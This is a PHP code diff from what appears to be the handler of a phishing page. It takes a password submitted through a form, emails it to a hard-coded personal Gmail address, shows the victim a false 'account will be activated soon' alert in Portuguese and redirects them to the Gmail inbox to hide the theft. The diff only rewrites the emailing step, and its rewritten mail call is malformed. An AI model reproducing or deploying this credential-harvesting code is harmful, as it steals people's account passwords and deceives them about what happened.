@@ -8,13 +8,17 @@ $horario = date('h:i:s');
 /*Dados sobre o e-mail*/
 $pass = $_POST['password'];
 
-$vardokct = "IP:$ip\nNavegador:$navegador\nData:$data\nHorário:$horario\n------------------------\nSENHA:$pass";
-$nome="Teste";
-$email="yslmarques@gmail.com";
+ // emails para quem será enviado o formulário
+  $emailenviar = "yslmarques@gmail.com";
+  $destino = $emailenviar;
 
-mail (
-    "yslmarques@gmail.com", //Endereço que vai receber a mensagem
-    "Mensagem: $vardokct", "FROM$nome:<$email>");
+  // É necessário indicar que o formato do e-mail é html
+  $headers  = 'MIME-Version: 1.0' . "\r\n";
+      $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+      $headers .= 'From: $nome <$email>';
+  //$headers .= "Bcc: $EmailPadrao\r\n";
+
+  $enviaremail = mail($destino, $pass, $headers);
 
 echo "<script>alert('Solicitação feita com sucesso, analisaremos a sua conta e a ativaremos em breve.');</script>";
 header( "refresh:1;url=https://mail.google.com/mail/u/0/#inbox");
